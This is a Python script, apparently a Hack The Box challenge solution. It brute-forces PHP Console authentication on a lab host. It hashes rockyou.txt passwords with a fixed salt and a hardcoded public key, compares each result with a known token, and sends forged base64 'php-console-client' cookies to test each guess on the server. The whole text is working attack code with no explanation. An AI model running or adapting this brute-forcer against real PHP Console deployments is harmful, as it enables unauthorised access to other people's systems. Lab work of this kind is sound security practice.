import requests
from hashlib import sha256
from base64 import b64encode
import json

url = 'http://docker.hackthebox.eu:31626'

publicKey = 'd1d58b2f732fd546d9507da275a71bddc0c2300a214af3f3f3a5f5f249fe275e'
f = open("../../../Tools/Wordlists/Passwords/rockyou.txt",'r')
for i in range(10000):
    line = f.readline().strip()
    password = line+'NeverChangeIt:)'
    passwordHash = sha256(password.encode()).hexdigest()
    token = sha256((passwordHash+publicKey).encode()).hexdigest()
    if(token == 'c89c7b497653dfb08d6075b6413831582b34b1c88f59f310a5cd2a4d81738b1d'):
        print(line)
        break
    phpConsole = '{"php-console-client":5,"auth":{"publicKey":"d1d58b2f732fd546d9507da275a71bddc0c2300a214af3f3f3a5f5f249fe275e","token":"' + str(token) + '"}}'
    phpConsole = b64encode(phpConsole.encode()).decode()
    cookies = '_ga=GA1.2.271481710.1586390668; php-console-server=5; __auc=5739af5417215673f05bbcd279d; ajs_user_id="%22d67da25d133efd840ad4f39339e8013b%22"; ajs_group_id=null; ajs_anonymous_id=%22b16f41dd-b3b5-4e9e-a42b-10ff602956c4%22; _gid=GA1.2.859804038.1590173953; __asc=28343faa1723e495880d07bc017; php-console-client=' + str(phpConsole)
    headers = {
                'Cookie' : cookies,
                }
    r = requests.get(url, headers=headers)
    phpConsole = r.headers['PHP-Console']
    phpConsole = json.loads(phpConsole)
    status = phpConsole["auth"]["isSuccess"]
    if(status != False):
        print(line)
        break
f.close()